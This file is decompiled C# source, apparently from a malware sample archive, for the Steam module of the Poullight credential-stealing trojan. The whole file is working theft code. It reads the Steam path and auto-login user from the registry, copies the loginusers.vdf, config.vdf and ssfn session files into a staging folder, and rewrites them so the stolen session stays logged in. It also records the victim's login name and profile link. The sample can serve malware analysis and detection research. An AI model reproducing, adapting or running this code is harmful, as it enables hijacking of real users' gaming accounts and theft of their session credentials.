// Decompiled with JetBrains decompiler
// Type: Steam
// Assembly: Poullight, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A9555FC6-4E86-4D22-9A29-AD3955B2BC52
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\Trojan-PSW.MSIL.Poul.gen-67cfa95ccaa06c437e04f38c3ef890986c1885c61636b84bf51d16b0d7bf957c.exe

using Microsoft.Win32;
using Poullight.Properties;
using System.IO;
using System.Text;

internal class Steam
{
  protected static void err()
  {
    File.WriteAllText(string.Format("{0}\\Steam\\info.txt", (object) Buffer.path_l), string.Format("{0}Steam не найден на компьютере. (Или невозможно войти в аккаунт)", (object) Buffer.head));
    Buffer.XBufferData[6] = "0";
  }

  protected static void cfgfix(string login, string config, string username)
  {
    if (!File.Exists(login))
      return;
    if (!File.Exists(config))
      return;
    try
    {
      string contents = File.ReadAllText(login, Encoding.GetEncoding("Windows-1251")).Replace("\"RememberPassword\"\t\t\"0\"", "\"RememberPassword\"\t\t\"1\"").Replace("\"mostrecent\"\t\t\"0\"", "\"mostrecent\"\t\t\"1\"");
      string data = File.ReadAllText(config, Encoding.GetEncoding(1251));
      try
      {
        if (File.Exists(login))
          File.Delete(login);
      }
      catch
      {
      }
      try
      {
        if (File.Exists(config))
          File.Delete(config);
      }
      catch
      {
      }
      string newValue1 = Exporter.Export("\"MTBF\"\t\t\"", "\"", data);
      string str = "\"Accounts\"" + Exporter.Export("\"Accounts\"", "\t\t\t\t\t}\n\t\t\t\t}", data) + "\t\t\t\t\t}\n\t\t\t\t}";
      string newValue2 = "\"ConnectCache\"" + Exporter.Export("\"ConnectCache\"", "\t\t\t\t}", data) + "\t\t\t\t}";
      File.WriteAllText(login, contents, Encoding.GetEncoding(1251));
      File.WriteAllText(config, Encoding.UTF8.GetString(Resources.SteamCfg).Replace("{$MTBF}", newValue1).Replace("{$Accounts}", str).Replace("{$ConnectCache}", newValue2), Encoding.GetEncoding("Windows-1251"));
      File.WriteAllText(string.Format("{0}Steam\\Ссылка на аккаунт.txt", (object) Buffer.path_l), "https://steamcommunity.com/profiles/" + Exporter.Export("\"SteamID\"\t\t\"", "\"", Exporter.Export(username, "}", str)).Replace("\"", ""), Encoding.GetEncoding(1251));
    }
    catch
    {
    }
  }

  public static bool Start()
  {
    string path1 = string.Format("{0}Steam", (object) Buffer.path_l);
    if (!Directory.Exists(path1))
      Directory.CreateDirectory(path1);
    RegistryKey registryKey;
    string path2;
    try
    {
      registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Valve\\Steam");
      path2 = registryKey.GetValue("SteamPath").ToString().Replace("/", "\\");
    }
    catch
    {
      Steam.err();
      return false;
    }
    if (!string.IsNullOrEmpty(path2) && registryKey != null && Directory.Exists(path2))
    {
      if (string.IsNullOrEmpty(registryKey.GetValue("AutoLoginUser").ToString()))
      {
        Steam.err();
        return false;
      }
      string str1 = registryKey.GetValue("AutoLoginUser").ToString();
      if (Directory.Exists(path2 + "/config"))
      {
        string[] files1 = Directory.GetFiles(path2 + "/config", "*.vdf");
        string[] files2 = Directory.GetFiles(path2, "ssfn*");
        if (files1.Length != 0)
        {
          foreach (string str2 in files1)
          {
            try
            {
              string fileName = Path.GetFileName(str2);
              if (!(fileName.ToLower() == "loginusers.vdf"))
              {
                if (!(fileName.ToLower() == "config.vdf"))
                  continue;
              }
              File.Copy(str2, path1 + "/" + fileName, true);
            }
            catch
            {
            }
          }
          if (files2.Length != 0)
          {
            foreach (string str3 in files2)
            {
              try
              {
                string fileName = Path.GetFileName(str3);
                File.SetAttributes(str3, FileAttributes.Normal);
                File.Copy(str3, path1 + "/" + fileName, true);
              }
              catch
              {
              }
            }
            try
            {
              Steam.cfgfix(path1 + "/loginusers.vdf", path1 + "/config.vdf", str1);
            }
            catch
            {
            }
            File.WriteAllText(path1 + "/AccountLogin.TXT", str1);
          }
          Buffer.XBufferData[6] = "1";
          return true;
        }
      }
    }
    Steam.err();
    return false;
  }
}
